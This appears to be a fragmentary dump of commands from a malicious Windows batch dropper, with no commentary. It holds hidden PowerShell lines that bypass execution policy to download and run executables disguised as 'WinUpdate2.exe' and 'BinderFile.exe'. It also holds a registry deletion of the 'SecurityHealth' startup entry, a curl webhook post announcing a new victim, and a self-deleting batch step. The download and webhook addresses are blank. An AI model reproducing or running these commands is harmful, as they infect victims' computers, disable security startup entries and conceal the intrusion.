...
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"- Someone has been Fucked Go and Check :joy: \"}" 
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('','%TEMP%\r-77MONSTERMCBUILDERr-77.exe');Powershell.exe -ExecutionPolicy Bypass -File '%TEMP%\r-77MONSTERMCBUILDERr-77.exe'
...
%TEMP%\WinUpdate2.exe
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('','%TEMP%\BinderFile.exe');Powershell.exe -ExecutionPolicy Bypass -File '%TEMP%\BinderFile.exe'
%TEMP%\BinderFile.exe
...
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"- Someone has been Fucked Go and Check :joy: \"}" 
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient)
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient)
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient)
%TEMP%\BinderFile.exe
echo del BatchByload.bat /f /q >> DeletBaybe.bat
